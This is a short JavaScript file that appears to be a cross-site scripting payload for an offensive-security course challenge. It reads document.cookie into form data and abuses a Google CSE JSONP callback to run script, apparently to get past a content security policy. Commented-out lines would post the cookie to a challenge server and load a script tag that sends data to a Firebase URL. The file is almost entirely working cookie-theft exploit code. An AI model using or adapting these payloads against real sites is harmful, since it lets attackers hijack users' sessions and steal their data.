var formData = new FormData();
formData.append('title', 'test');
formData.append('content', document.cookie);
formData.append('submit', 'save');

fetch("https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1)")
.then(res=>{

});
//fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
//    method: "POST",
//    credentials: "same-origin",
//    body: formData
//}).then(res => {
//    alert(response.json);
//});

//<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=fetch('https://test-43d17.firebaseio.com/cookie.json', {method:'POST',body:JSON.stringify('test')})"></script>
